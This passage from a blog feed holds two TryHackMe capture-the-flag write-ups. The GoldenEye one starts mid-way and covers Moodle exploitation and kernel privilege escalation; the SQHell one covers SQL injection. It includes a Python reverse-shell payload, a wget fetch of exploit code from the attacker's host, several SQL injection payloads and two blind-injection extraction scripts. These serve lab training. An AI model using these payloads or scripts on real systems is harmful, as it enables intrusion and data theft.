        for &amp;lt;doak&amp;gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;

.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I logged out of http://severnaya-station.com/gnocertdir/ as xenia and logged in as dr_doak. Looking around the webpage I found private files for james.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/privatefiles.png&quot; alt=&quot;privatefiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded the file to my machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Navigating to http://severnaya-station.com/dir007key/for-007.jpg I found an image:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/for-007.jpg&quot; alt=&quot;007&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded the file and used exiftools to check for any credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $exiftool for-007.jpg 
ExifTool Version Number         : 11.97
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2021:06:27 12:27:18+01:00
File Access Date/Time           : 2021:06:27 12:27:18+01:00
File Inode Change Date/Time     : 2021:06:27 12:27:18+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The image description looks like base64 so using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -n &quot;eFdpbnRlcjE5OTV4IQ==&quot; | base64 -d&lt;/code&gt; I was able to retrieve the admin password.&lt;/p&gt;

&lt;h3 id=&quot;shell&quot;&gt;Shell&lt;/h3&gt;

&lt;p&gt;As an admin on moodle we get a lot more options, the moodle version is 2.2.3, googleing for ‘moodle 2.2.3 exploit’, the first result provides an &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/&quot;&gt;exploit&lt;/a&gt; using the spell check function. Reading the source code it looks fairly straight forward so I decided to do manualy rather than use Metasploit.&lt;/p&gt;

&lt;p&gt;First I updated the system path with the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;&amp;lt;local machine IP&amp;gt;&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/systempath.png&quot; alt=&quot;systempath&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next I changed the shell engine to use ‘PSpellShell’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/updatedshell.png&quot; alt=&quot;updatedshell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I started a netcat listener on my local machine and then on the webpage went to add a post, once the editor loaded and clicked spell check and got a shell!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/spellcheck.png&quot; alt=&quot;spellcheck&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [&amp;lt;&amp;lt;REDACTED&amp;gt;&amp;gt;] from (UNKNOWN) [10.10.50.94] 55215
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;The machine is running linux 3.13.0-32, googeling linux 3.13.0-32 priv esc I found a linux kernal exploit. Details of the exploit can be found &lt;a href=&quot;https://www.cvedetails.com/cve/cve-2015-1328&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I downloaded the &lt;a href=&quot;https://www.exploit-db.com/exploits/37292&quot;&gt;exploit code&lt;/a&gt; from exploit-db and copied it to machine using python.&lt;/p&gt;

&lt;h5 id=&quot;my-machine&quot;&gt;My machine&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $mv ~/Downloads/37292.c .
┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $ls
37292.c  for-007.jpg  nmap  s3cret.txt
┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $mv 37292.c exploit.c
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $sudo python3 -m http.server 80
[sudo] password for daz: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&quot;victim&quot;&gt;Victim&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ wget http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
--2021-06-27 04:54:42--  http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
Connecting to &amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: 'exploit.c'

100%[======================================&amp;gt;] 5,119       --.-K/s   in 0.003s

2021-06-27 04:54:42 (1.83 MB/s) - 'exploit.c' saved [5119/5119]

www-data@ubuntu:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The code provides the compile intructions, I simply need to run gcc and specific the output flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ gcc exploit.c exploit
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
www-data@ubuntu:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;GCC is not installed however I can use ‘cc’. However for the exploit to work I need to change a line in the file to reference cc rather than gcc.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lib = system(&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now the line has changed I can use cc to compile the code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ cc exploit.c -o exploit
exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &amp;amp;status, 0);
            ^
exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few warmming messages are generated however the exploit still works and we get a root shell!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ ./exploit 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">SQHell Write Up</title>
      <link href="https://darrynbrownfield.co.uk/sqhell" rel="alternate" type="text/html" title="SQHell Write Up" />
      <published>2021-05-31T00:00:00+00:00</published>
      <updated>2021-05-31T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/sqhell</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/sqhell">&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/cover.jpeg&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/sqhell&quot;&gt;sqhell&lt;/a&gt; is a fun medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/adamtlangley&quot;&gt;Adam Langley&lt;/a&gt;. I found this room incredibly frustrating but also very rewarding and really helped me understand some key SQLI techniques.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I have wrote this write up over a couple of days, so I’ve added a entry in my etc hosts file of ‘sqhell.thm’ to provide consistency across the screen shots as the IP will change.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.24.70
# Nmap 7.80 scan initiated Sun May 30 17:55:54 2021 as: nmap -sC -sV -oA nmap/initial 10.10.24.70
Nmap scan report for 10.10.24.70
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 30 17:56:03 2021 -- 1 IP address (1 host up) scanned in 8.36 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 8.2p1&lt;/li&gt;
  &lt;li&gt;80 - HTTP - nginx 1.18.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h3&gt;

&lt;p&gt;Based on the room name I know this is going to consist of SQLI challenges so I went straight to the web page and found a blog.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first thing I looked at was the login page, and tried the usual bypass technique: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' or 1=1;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag1.png&quot; alt=&quot;flag1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-2&quot;&gt;Flag 2&lt;/h3&gt;

&lt;p&gt;Flag 2 was the first of the two difficult flags, Looking at the room hints:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Make sure to read the terms and conditions ;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/TCs.png&quot; alt=&quot;TCs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A common way of monitoring a client IP is adding a header to the web request such as ‘X-Forwarded-For: &lt;client ip=&quot;&quot;&gt;', I've seen this a lot on load balancers and WAF's to provide persistance and send all requests from a single source to the same webserver. Below are some example headers:&lt;/client&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;X-Forwarded-For:&lt;/li&gt;
  &lt;li&gt;X-Originating-IP:&lt;/li&gt;
  &lt;li&gt;X-Remote-IP:&lt;/li&gt;
  &lt;li&gt;X-Remote-Addr:&lt;/li&gt;
  &lt;li&gt;X-Forwarded-Host:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I can use time based SQL injection and use sleep, if the header is vulnerable the page will sleep (wait) before returning the page.&lt;/p&gt;

&lt;p&gt;I opened Burp and added the X-Forwarded-For header, I tried lots of payloads with no success until I found a great &lt;a href=&quot;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&quot;&gt;resource&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Finally the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '1'='1&lt;/code&gt; worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/timebased.gif&quot; alt=&quot;timebased&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now I know the X-Forwarded-For header is vulnerable I need to find a way to retrieve data. The flag format is ‘THM{FLAG……’ and stored in the flag column in the flag table so I can use substring to check for each character and if its a match then sleep.&lt;/p&gt;

&lt;p&gt;Using &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/sql-injection&quot;&gt;hacktricks&lt;/a&gt; I created the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;1' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1&lt;/code&gt;. I tested a few characters and incremented the offset and it confirmed this was flag 2. I created the below python script to automate the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell

import requests
import time
import string

url = &quot;&quot; #Room IP

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

flag = &quot;&quot;
counter = 1

payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1&quot;

headers = {'X-Forwarded-For':payload}

while True:
    for i in characterlist:
        payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1&quot;
        headers = {'X-Forwarded-For':payload}
        start = time.time()
        r = requests.get(url, headers = headers)
        end = time.time()
        if end-start &amp;gt;= 2:
            flag += i
            counter += 1
            break
    print(flag)
    if len(flag) &amp;gt;= 43:
        exit(f&quot;The Flag is: {flag}&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script will retrieve the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag2.png&quot; alt=&quot;flag2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-3&quot;&gt;Flag 3&lt;/h3&gt;
&lt;p&gt;Looking at the register page of the blog, its possible to check if a username already exists.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is done by a script in the page source code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;script&amp;gt;
    $('input[name=&quot;username&quot;]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It’s possible to navigate directly to this endpoint to check the result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/usernameavailable.gif&quot; alt=&quot;checkusername&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use this to provide logic to determine if a condition is true or false. Using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=2;-- -&lt;/code&gt; which of course is not true as 1 doesnt equal 1 returns an available = true statement.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/false.png&quot; alt=&quot;false&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=1;-- -&lt;/code&gt; which is true returns available = false&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/true.png&quot; alt=&quot;true&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using substring again allows for each character to be checked. If the character is a match, an available equals false will be returned. To confirm I used the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T';-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This worked and returned a false statement. I created a script to automate the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;import requests
import string

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

ip = &quot;&quot; #change to machine IP

flag = &quot;&quot;

counter = 1

while True:
    for i in characterlist: # loop through each character in the character list
        r = requests.get(&quot;http://&quot; +  ip + f&quot;/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -&quot;) #create request
        if 'false' in r.text: # check if return 'false' statement which indicates a match
            flag += i # add the character to the flag string
            counter += 1 # increment the counter by one to then check the next letter
            print(flag) 
            break
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script provided the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag3.png&quot; alt=&quot;flag3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-4&quot;&gt;Flag 4&lt;/h3&gt;
&lt;p&gt;Flag 4 was the second of the two difficult flags, it has the following hint:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Well, dreams, they feel real while we’re in them right?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Googling this provides references to the film Inception. Looking at a user on the blog, showed details of the user along with the posts they had submitted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/user.png&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried a union select payload and repeated adding null entires until I was able to determine the number of columns which was 3.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=1 union select null,null,null;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;select&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now spent a long time enumerating the database to find the flag but with no luck. While completing the enumeration I was able to determine there was only one user. Any other number resulted in user not found being returned.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;user2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, even with an invalid user id, if I changed the first null value to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; I could return a list of the users posts. Which would indicate another SQL query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/id1.png&quot; alt=&quot;id1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So to test this I created another union select statement in the user id colum using the same technique as before by repeatedly adding null columns. Once I got to 4 columns the two posts were returned with a blank bullet point.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/inception.png&quot; alt=&quot;inception&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now it was just a case of finding a column which I could use to populate the flag which was column two and select the flag from the flag table. The final payload was: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=2 union select &quot;1 union select null,flag,null,null from flag&quot;,null,null from information_schema.tables where table_schema=database();-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag4.png&quot; alt=&quot;flag4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-5&quot;&gt;Flag 5&lt;/h3&gt;
&lt;p&gt;Flag 5 is obtained by using union based injection Looking at the post page url, the posts are retrieved by id: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/postid.png&quot; alt=&quot;postid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks injectable, to confirm I simply added a &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; after the id number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/iderror.png&quot; alt=&quot;iderror&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This resulted in an error indicating an SQLI could be possible. For a union select injection attack to work the number of returned columns need to match the original query. I used order by to determine the number of columns.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idorder.gif&quot; alt=&quot;idorder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got an error on order by 5 indicating there are 4 columns.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idtesting.png&quot; alt=&quot;idtesting&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was then able to simple retrieve the flag using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2 and 1=2 union select null,null,flag,null from flag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag5.png&quot; alt=&quot;flag5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/&lt;/li&gt;
  &lt;li&gt;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&lt;/li&gt;
  &lt;li&gt;https://book.hacktricks.xyz/pentesting-web/sql-injection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
